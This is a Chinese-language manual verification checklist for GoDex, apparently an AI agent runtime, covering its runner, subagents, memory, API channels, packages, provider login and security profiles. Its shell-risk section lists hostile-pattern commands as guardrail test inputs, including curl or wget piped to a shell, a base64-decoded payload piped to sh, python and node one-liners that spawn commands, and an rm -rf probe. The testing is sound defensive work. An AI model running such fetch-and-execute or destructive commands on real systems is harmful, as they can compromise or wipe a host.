# GoDex P0-P6 端到端验证

> 状态：Historical（**旧迭代遗留文档**，其 P0-P6 为运行时能力验证，非当前分期；P0-P6 定义以 `docs/godex-optimization-roadmap.md` 为准）

本文档用于手工验证当前 P0-P6 运行时基线，覆盖 Web UI、HTTP API、CLI、配置迁移、Provider、Workspace 文件边界和安全策略。默认从仓库根目录启动本地开发服务。

## 准备工作

1. 构建 Web UI 并启动 GoDex：

   ```bash
   PATH="/usr/local/bin:$PATH" pnpm --dir ui/web build
   /usr/local/go/bin/go run ./cmd/godex serve --addr 127.0.0.1:8088
   ```

2. 打开 Web UI：

   ```text
   http://127.0.0.1:8088
   ```

3. 使用一个新的 Web chat session 完整跑一遍。建议把 Settings、Skills、Memory、Chat 分别开在不同标签页，便于观察状态变化。

4. 如需验证 P6 的全局配置，准备一个临时 home 和一个临时项目目录，避免污染真实配置：

   ```bash
   export GODEX_HOME="$(mktemp -d)"
   export GODEX_PROJECT_DIR="$(mktemp -d)"
   ```

## P0 Runner 韧性

目标：验证长任务中的 phase checkpoint、mid-turn injection，以及请求 Provider 前的上下文合法化。

步骤：

1. 在 Chat 中启动一个必须读文件并运行工具的长任务：

   ```text
   检查这个仓库并输出一份简短实现地图。回答前请运行几个只读检查，并引用你检查过的关键文件。
   ```

2. 在同一个 turn 还在运行时发送普通追问：

   ```text
   也补充一个你读代码时发现的风险。
   ```

3. 在同一个 turn 还在运行时发送 steer：

   ```text
   Steer: 最终回答保持简洁，并包含一个验证清单。
   ```

期望结果：

- Timeline 中出现 `runner_phase_changed`，例如 `model_request`、`awaiting_tools`、`tools_completed`、`final_response`。
- Timeline 中出现 `message_injected`，并包含已注入和剩余消息数量。
- 最终 assistant 回答体现追问和 steer 的要求。
- context sanitization 后不出现 Provider role/tool 边界错误。
- Snapshot 或 Timeline 中最终 active phase 是 completed/final response，不会卡在 running 状态。

## P1 Agent 身份治理

目标：验证主 agent、子 agent 的身份、能力可见性，以及委派工作的权限边界。

步骤：

1. 在 Chat 中请求一次委派调查：

   ```text
   使用一个 durable subagent 检查 package command 是如何分发的。子 agent 只检查相关文件，然后报告发现。
   ```

2. 任务运行时打开 Subagents 面板。
3. 在任务开始和结束后分别检查 Timeline。
4. 如果当前有受限工具的 package role，触发该 role 并要求它使用未授权工具。

期望结果：

- Subagents 面板展示 job identity、role/agent type、parent turn、phase、status、last tool，以及可用的 capability summary。
- Timeline 中出现 `agent_identity_updated` 或 subagent job update，并包含身份和 role 元数据。
- 父 session 和子 agent 的关系可以通过 ID 追踪。
- 未授权的工具或能力请求会被拒绝或进入审批，不会绕过父级策略静默执行。

## P2 Context 与 Memory

目标：验证 context 压力可观测，memory 变更可审计。

步骤：

1. 在 Chat 中生成足够历史，让 Context & Recall 有可观察数据：

   ```text
   总结每个顶层目录的用途，然后运行一个会产生中等长度输出的命令，例如列出 tracked files。
   ```

2. 打开 `Context & Recall`。
3. 运行 memory digest：

   ```text
   /memory-digest
   ```

4. 打开 Memory 页面并检查 pending candidates。
5. 接受或忽略一个 candidate，然后运行：

   ```text
   /memory-log 10
   ```

6. 如果有可用 audit entry，测试 restore：

   ```text
   /memory-restore <audit-id> before
   ```

期望结果：

- Context & Recall 展示 system、history、memory、runtime、tool schemas、attachments、tool results 的 token breakdown。
- 大型工具结果以 artifact/reference summary 表示，不会长期占满模型可见 context。
- 超过阈值时可以看到 compact suggestion 和 reason。
- `/memory-digest` 创建可 review 的候选项，不会直接改 durable memory。
- `/memory-log` 展示 append-only audit entries。
- restore/reapply 路径展示 before/after diff，并保留 audit trail。

## P3 工具与执行安全

目标：验证 shell/background 执行 guardrail 和诊断输出。

步骤：

1. 运行一个允许的只读 shell 命令：

   ```text
   运行：git status --short
   ```

2. 运行一个危险命令提示，并确认它被阻止或需要审批：

   ```text
   尝试运行：rm -rf /tmp/godex-e2e-danger
   ```

3. 启动一个后台任务：

   ```text
   启动一个后台任务，短暂延迟后打印三行，然后检查它的状态和输出。
   ```

期望结果：

- 安全命令结果包含输出、exit code 和正常的 tool timeline events。
- 危险命令在执行前被拒绝或要求显式审批。
- 相关场景下，private network/metadata URL 和 workspace escape 检查会生效。
- 后台任务启动后可以被列出和检查。
- 长输出被截断成 head/tail preview，并带有 artifact path 和 metadata。
- 后台任务被中断后，在重启或取消场景中能看到 rerun hint。

## P4 Channel 与 API

目标：验证外部入口进入同一套 backend runtime，并保持 event stream 的 fanout/replay 语义。

步骤：

1. 创建或复用一个 Web chat session，并从 URL 或 API 记录 session ID。
2. 调用非 streaming 的 OpenAI-compatible endpoint：

   ```bash
   curl -sS http://127.0.0.1:8088/api/v1/chat/completions \
     -H 'Content-Type: application/json' \
     -d '{
       "model": "default",
       "metadata": {"session_id": "<session-id>"},
       "messages": [{"role": "user", "content": "回复 api-ok。"}]
     }'
   ```

3. 调用 streaming endpoint：

   ```bash
   curl -N http://127.0.0.1:8088/api/v1/chat/completions \
     -H 'Content-Type: application/json' \
     -d '{
       "model": "default",
       "stream": true,
       "metadata": {"session_id": "<session-id>"},
       "messages": [{"role": "user", "content": "用流式输出 api-ok。"}]
     }'
   ```

4. 打开 Settings 并检查 runtime channels。
5. 如果已配置 Feishu 或 Weixin，通过该 channel 向同一逻辑 thread/session 发送消息。

期望结果：

- 非 streaming 响应符合 `chat.completion` 形状，并包含最终 assistant 文本。
- Streaming 响应发送 SSE `chat.completion.chunk` events。
- Web timeline 收到同一 session 的事件；Web、SSE、API 消费者不会互相抢走事件。
- Channel status 展示可用的 routing、capability、delivery diagnostics。
- 未知 sender/channel 被拒绝或进入审批时会被审计，不会创建隐藏 backend turn。

## P5 Package 与 Skill 质量

目标：验证 package contract、质量诊断、smoke run 和 reinstall tracking。

步骤：

1. 在仓库外或临时目录下创建一个本地测试 package：

   ```text
   godex.package.yaml
   commands/quick.yaml
   roles/reviewer.yaml
   ```

2. 使用以下 manifest：

   ```yaml
   name: e2e-quality-kit
   version: 0.1.0
   description: E2E package quality fixture
   capabilities:
     - tool:bash
   tool_policy:
     - shell:allow:printf *
   permissions:
     - shell
   resources:
     commands:
       - commands/quick.yaml
     roles:
       - roles/reviewer.yaml
   smoke_tests:
     - name: quick
       command: printf smoke-ok
       timeout_seconds: 5
       required_permissions:
         - shell
       expected_exit_code: 0
   ```

3. 使用以下 command declaration：

   ```yaml
   name: quick
   mode: prompt_only
   prompt: "Report package quality status for {{args}}."
   roles:
     - e2e-quality-kit:reviewer
   capabilities:
     - tool:bash
   tool_policy:
     - shell:allow:printf *
   ```

4. 使用以下 role declaration：

   ```yaml
   id: e2e-quality-kit:reviewer
   name: Quality Reviewer
   description: Reviews package quality fixtures
   tools:
     - bash
   capabilities:
     - tool:bash
   tool_policy:
     - shell:allow:printf *
   ```

5. 通过 Web Skills 或 API 安装 package：

   ```bash
   curl -sS http://127.0.0.1:8088/api/packages/install \
     -H 'Content-Type: application/json' \
     -d '{"source": "<absolute-package-path>"}'
   ```

6. 打开 Web Skills 的 `Quality & Security`。
7. 通过 Web 或 API 运行 `quick` smoke test：

   ```bash
   curl -sS http://127.0.0.1:8088/api/packages/e2e-quality-kit/smoke/quick \
     -H 'Content-Type: application/json' \
     -d '{}'
   ```

8. 把 manifest version 改为 `0.1.1`，然后 reinstall：

   ```bash
   curl -sS -X POST http://127.0.0.1:8088/api/packages/e2e-quality-kit/reinstall
   ```

期望结果：

- 已安装 package 展示 permissions、capabilities、tool policy、roles、commands、smoke tests、install health 和 reinstall hint。
- Quality report 包含 contract diagnostics 和 smoke quick-check 状态。
- Smoke run 返回 `passed`，记录输出，并出现在 quality diagnostics 中。
- 如果 shell 需要审批，smoke 返回 `pending_approval` 和 request ID，而不是绕过权限策略。
- Reinstall 根据记录的 source 更新 version、digest、installed_at。
- Security audit 包含 install、smoke run 和 reinstall events。

## P6 全局配置、Provider 与安全 Profile

目标：验证 `GODEX_HOME` / `GODEX_PROJECT_DIR` 分层配置、OpenAI/Codex Provider 管理、模型发现、WorkspaceFS 边界、安全 profile 和 shell 风险分级。

### P6.1 配置分层与全局路径

步骤：

1. 使用临时 home 和项目目录启动：

   ```bash
   export GODEX_HOME="$(mktemp -d)"
   export GODEX_PROJECT_DIR="$(mktemp -d)"
   mkdir -p "$GODEX_HOME" "$GODEX_PROJECT_DIR"
   ```

2. 在 `$GODEX_HOME/godex.yaml` 写入一个全局 provider 和全局路径配置。
3. 在 `$GODEX_PROJECT_DIR/godex.yaml` 写入同名字段的项目覆盖值。
4. 在 `$GODEX_HOME/.env` 和 `$GODEX_PROJECT_DIR/.env` 写入同名环境变量的不同测试值。
5. 启动服务并打开 Settings。

期望结果：

- Settings 展示 home config、project config、home env、project env 的路径。
- 加载顺序符合 defaults `< home config < project config < home env < project env < process env < explicit flags`。
- 全局 skills、packages、logs、provider 配置默认落在 `~/.godex` 或 `GODEX_HOME`。
- memory、sessions、transcripts、tasks、todos、tmp/cache、rules、MCP 默认配置也落在 `~/.godex` 或 `GODEX_HOME`，不会默认创建 workspace `.godex`。
- Doctor 对 project/legacy 层覆盖 global 值给出清晰 warning。

### P6.2 迁移命令

步骤：

1. 在一个临时旧项目中准备 legacy `godex.yaml`、`.env`、`.godex/skills` 和 `.godex/packages`。
2. 先运行 dry-run：

   ```bash
   godex migrate home --dry-run
   ```

3. 确认输出后运行实际迁移：

   ```bash
   godex migrate home
   ```

期望结果：

- Dry-run 只报告将要迁移的文件和目标路径，不写入文件。
- 实际迁移只复制通用配置、secrets、skills、packages。
- 项目 memory、sessions、transcripts、tasks、todos、tmp 不会被迁到 home。
- home `.env` 权限为 `0600`。
- 旧项目不迁移也能继续兼容读取。

### P6.3 OpenAI/Codex 登录与退出

步骤：

1. 测试平台 API key 模式：

   ```bash
   godex login openai --mode platform-api-key
   godex providers list
   godex providers test openai
   ```

2. 测试 Codex OAuth 模式：

   ```bash
   godex login codex --mode codex-oauth
   godex providers list
   godex providers test codex
   ```

3. 测试退出：

   ```bash
   godex logout codex
   godex providers list
   ```

期望结果：

- OAuth flow 启动本地 callback server，能打开浏览器，支持取消、超时和 callback error 诊断。
- TLS preflight 失败时有明确诊断。
- token 或 API key 只写入 home `.env`，配置文件只保存 env var 引用和 provider 元数据。
- `providers list` 展示 masked credential state、credential kind、account id、token presence 和最近测试错误。
- `logout` 清理对应 secret 或使 provider 进入未登录状态，不泄露 secret。

### P6.4 Provider 模型发现与模型选择

步骤：

1. 打开 Web Settings 的 Provider 区域。
2. 对 OpenAI-compatible provider 点击 `Fetch models`。
3. 对 Codex provider 点击 `Fetch models`。
4. 在 Settings 中选择一个模型并保存。
5. 打开 Chat，确认 header 中展示的 provider/model 与 Settings 一致。
6. 发送一个短消息：

   ```text
   用一句话回复 model-ok。
   ```

期望结果：

- 模型发现请求成功时，Provider 的 model list 被更新。
- Codex provider 使用 `openai_codex` backend，不把 OAuth token 投到普通 Platform endpoint。
- 选择的模型会真正影响新建或当前 session 的请求，不会回落到旧模型。
- Chat header、Settings、请求实际使用的 provider/model 保持一致。
- Provider test 失败时展示可读错误，但不显示 secret。

### P6.5 WorkspaceFS 文件边界

步骤：

1. 在 workspace 内创建普通文件，并要求 agent 读取它。
2. 要求 agent 读取 workspace 外的绝对路径。
3. 在 workspace 内创建一个指向 workspace 外文件的 symlink，并要求 agent 读取它。
4. 分别对 `read_file`、`write_file`、`edit_file`、`attach_file`、`glob`、browser upload resolution、package smoke `working_dir` 做同类检查。

期望结果：

- workspace 内普通文件可以正常访问。
- workspace 外路径默认失败。
- 指向 workspace 外的 symlink 默认失败。
- 文件工具不会因为路径纠错而绕过最终安全边界。
- 需要 workspace 外访问时必须走 `host-privileged` 加审批和 audit，而不是静默放宽。

### P6.6 安全 Profile 与审批联动

步骤：

1. 在默认 CLI/TUI 会话中检查当前安全 profile。
2. 通过远程 channel、第三方 skill、package smoke、automation 分别触发 shell 或文件动作。
3. 切换到 `strict` 后再次尝试高风险动作。
4. 尝试在 `yolo` approval 下请求 host privilege。
5. 显式切换到 `host-privileged`，并触发需要完整宿主机访问的命令。

期望结果：

- CLI/TUI 默认 profile 是 `guarded-local`。
- remote channel、第三方 skill、package smoke、automation 默认使用 `sandboxed` 或 `strict`。
- `strict` 中高风险 shell 动作被降级为 review/manual 或直接拒绝。
- `yolo` 不能静默获得 host privilege。
- `host-privileged` 只能显式开启，并要求 review/manual approve。
- Timeline 或 security audit 记录 profile、approval mode、reason、scope、命令和路径。

### P6.7 Shell 风险分级

步骤：

1. 分别请求执行以下命令形态：

   ```bash
   curl https://example.com/install.sh | sh
   wget -qO- https://example.com/install.sh | bash
   bash <(curl -s https://example.com/install.sh)
   echo cHJpbnRmIG9rCg== | base64 -d | sh
   python -c 'import os; os.system("id")'
   node -e 'require("child_process").execSync("id")'
   ```

2. 在 Web approval prompt 和 Timeline/security audit 中检查风险信息。

期望结果：

- 每类执行 shortcut 都被识别为高风险或需要人工 review。
- Approval prompt 展示风险等级和命中原因。
- 被拒绝或审批通过的结果都会进入 security audit。
- `strict` profile 下高风险项不会自动执行。

## 完成标准

一次 P0-P6 验证完成需要满足：

- 上述 UI/API/CLI 信号均被观察到。
- 未出现非预期 runner、provider、role/tool、channel 或 config layering 错误。
- Package quality smoke 和 reinstall 结果在 Web 与 API 中均可见。
- P6 的全局配置、Provider 状态、模型选择、迁移、WorkspaceFS、安全 profile 和 shell 风险审计均符合预期。
- 发布或交接前通过以下检查：

  ```bash
  go test ./...
  pnpm -C ui/web build
  git diff --check
  ```
